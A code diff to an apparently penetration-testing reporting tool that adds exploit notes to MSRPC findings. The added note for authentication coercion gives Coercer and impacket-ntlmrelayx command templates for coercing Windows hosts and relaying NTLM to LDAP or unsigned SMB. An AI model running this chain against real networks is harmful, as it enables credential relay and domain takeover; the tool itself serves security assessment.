@@ -467,13 +467,15 @@ def msrpc_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     # Per-finding tool: MSRPC findings point at different tools (rpcmap for the
     # endpoint mapper dump, Coercer for the coercion interfaces), unlike other
     # modules where every finding routes back to one CLI.
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": tool, "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -526,7 +528,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Patch and disable the unused services (Spooler, EFS, DFS-N); enforce "
                     "SMB/LDAP signing and channel binding so a coerced authentication "
                     "cannot be relayed.",
-                    ["CWE-287", "CWE-306"], kind="msrpc_coercion"))
+                    ["CWE-287", "CWE-306"], kind="msrpc_coercion",
+                    exploit_note=(
+                        "Coercer scan -t <ip> (identifies which coerce methods "
+                        "respond); Coercer coerce -t <ip> -l <you-ip> -u <lp> "
+                        "-p <lpass>; pair with impacket-ntlmrelayx -t ldap://<dc> "
+                        "or smb://<unsigned-target>."),
+                    depth_tier="t1"))
 
             ifaces = pr.get("interfaces") or []
             extra = [u for u in ifaces if u not in _COERCION]
